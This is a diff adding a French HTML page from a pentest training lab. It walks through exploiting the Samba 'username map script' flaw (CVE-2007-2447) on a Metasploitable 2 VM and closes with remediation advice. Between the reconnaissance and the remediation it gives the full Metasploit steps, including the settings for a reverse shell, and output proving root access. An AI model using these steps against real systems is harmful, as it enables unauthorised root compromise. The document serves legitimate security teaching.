@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Samba username map script — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">Samba — username map script</h1>
+    <h2 class="doc-subtitle">Exécution de commande via un nom d'utilisateur non assaini (RCE)</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>Samba (SMB) — ports <code class="mono">139/445</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447">CVE-2007-2447</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Accès root</strong> (shell de commande, sans identifiant valide)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Lorsque Samba est configuré avec l'option <code>username map script</code>, il transmet le
+  nom d'utilisateur reçu lors d'une connexion à un script shell côté serveur. Dans les versions
+  vulnérables, ce nom n'est <strong>pas assaini</strong> : un nom contenant des métacaractères
+  shell fait exécuter des commandes arbitraires, sans qu'un compte valide soit nécessaire. Le
+  scan de reconnaissance identifie un serveur Samba sur les ports 139 et 445.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms2-samba-usermap/01-recon-nmap.png" alt="Scan nmap des ports 139 et 445">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sV -p 139,445 192.168.56.101</code> : Samba
+      <code>smbd 3.X - 4.X</code> (workgroup WORKGROUP). La version exacte (plage 3.0.20–3.0.25)
+      sera confirmée par la recherche d'exploit.</span>
+      <span class="fname">images/ms2-samba-usermap/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>Première question : cette version de Samba a-t-elle une faille connue ?</p>
+
+  <pre class="terminal">$ searchsploit samba 3.0
+
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution | unix/remote/16320.rb</pre>
+
+  <p>La faille existe pour la plage 3.0.20–3.0.25rc3, celle de Metasploitable 2. Chemin du
+  module dans <code>msfconsole</code> :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "search usermap_script; exit"
+
+#  Full Name                           Disclosure Date  Rank       Check  Name
+-  ---------                           ---------------  ----       -----  ----
+0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution</pre>
+
+  <p>Puis la CVE et le mécanisme :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/multi/samba/usermap_script; exit"
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  http://samba.org/samba/security/CVE-2007-2447.html</pre>
+
+  <p>La section <code>References</code> confirme <strong>CVE-2007-2447</strong>. Le module se
+  connecte au service et envoie un <strong>nom d'utilisateur forgé</strong> contenant une
+  commande shell ; faute d'assainissement, le <code>username map script</code> l'exécute avec
+  les droits du démon Samba — <strong>root</strong> sur cette VM.</p>
+
+  <blockquote class="evidence">
+    Commande injectée via le champ « nom d'utilisateur » d'une connexion SMB &mdash; aucun
+    identifiant valide requis. Exécution avec les droits root du démon Samba.
+  </blockquote>
+
+  <figure class="capture" id="cap-recherche">
+    <img src="../images/ms2-samba-usermap/02-recherche-module.png" alt="searchsploit samba puis search usermap_script">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc"><code>searchsploit samba 3.0</code> confirme la faille pour la plage de
+      versions, puis <code>search usermap_script</code> donne le chemin du module
+      (<code>exploit/multi/samba/usermap_script</code>).</span>
+      <span class="fname">images/ms2-samba-usermap/02-recherche-module.png</span>
+    </figcaption>
+  </figure>
+
+  <figure class="capture" id="cap-info-cve">
+    <img src="../images/ms2-samba-usermap/03-info-cve.png" alt="info du module, section References avec la CVE">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Résultat de <code>info</code> sur le module : la section
+      <code>References</code> donne <strong>CVE-2007-2447</strong>.</span>
+      <span class="fname">images/ms2-samba-usermap/03-info-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Démarche interactive dans <code>msfconsole</code>, commande par commande :</p>
+
+  <pre class="terminal">msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
+RHOSTS => 192.168.56.101
+msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1
+LHOST => 192.168.56.1
+msf6 exploit(multi/samba/usermap_script) > set LPORT 4446
+LPORT => 4446</pre>
+
+  <p><strong class="field">Point d'attention —</strong> pas de <code>RPORT</code> à régler
+  (445 par défaut) ni de <code>payload</code> à changer (<code>cmd/unix/reverse</code> par
+  défaut convient). <code>LHOST</code>/<code>LPORT</code> restent nécessaires car il s'agit
+  d'un reverse shell.</p>
+
+  <figure class="capture" id="cap-config">
+    <img src="../images/ms2-samba-usermap/04-exploit-config.png" alt="Configuration du module avant lancement">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Chargement du module et configuration des options (<code>RHOSTS</code>,
+      <code>LHOST</code>, <code>LPORT</code>).</span>
+      <span class="fname">images/ms2-samba-usermap/04-exploit-config.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p><code>run -z</code> déclenche l'attaque ; <code>sessions -c "..." -i 1</code> exécute les
+  commandes de preuve dans la session :</p>
+
+  <pre class="terminal">msf6 exploit(multi/samba/usermap_script) > run -z
+[*] Command shell session 1 opened (192.168.56.1:4446 -> 192.168.56.101:40060)
+msf6 exploit(multi/samba/usermap_script) > sessions -c "id; uname -a; hostname; whoami" -i 1
+[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
+uid=0(root) gid=0(root)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+metasploitable
+root</pre>
+
+  <p>L'accès est <strong>root</strong> directement, sans étape d'élévation de privilèges : le
+  démon Samba tourne en root, donc la commande injectée via le nom d'utilisateur s'exécute en
+  root. Une simple option de configuration mal choisie donne un accès système complet sans
+  aucun identifiant valide.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms2-samba-usermap/05-session-root.png" alt="Shell root confirmé, uid=0">
+    <figcaption>
+      <strong class="idx">5.</strong>
+      <span class="desc">Ouverture de la session et sortie de
+      <code>id; uname -a; hostname; whoami</code> : accès confirmé en
+      <code>uid=0(root)</code> sur l'hôte <code>metasploitable</code>.</span>
+      <span class="fname">images/ms2-samba-usermap/05-session-root.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Mettre à jour Samba vers une version corrigée (postérieure à 3.0.25rc3), qui assainit
+      le nom d'utilisateur avant de le passer au script.</li>
+      <li>Supprimer l'option <code>username map script</code> de <code>smb.conf</code> si elle
+      n'est pas indispensable ; si elle l'est, n'y passer que des valeurs strictement
+      contrôlées et échappées.</li>
+      <li>N'exposer SMB qu'aux réseaux de confiance (pare-feu sur 139/445), jamais sur
+      Internet.</li>
+      <li>Faire tourner les services réseau sous un compte non privilégié quand c'est possible,
+      pour limiter l'impact d'une compromission.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/samba-usermap.md"><code>ms2/josa/samba-usermap.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2007-2447 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447">nvd.nist.gov/vuln/detail/CVE-2007-2447</a></li>
+    <li>Avis Samba : <a href="http://samba.org/samba/security/CVE-2007-2447.html">samba.org/samba/security/CVE-2007-2447.html</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — Samba username map script RCE</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
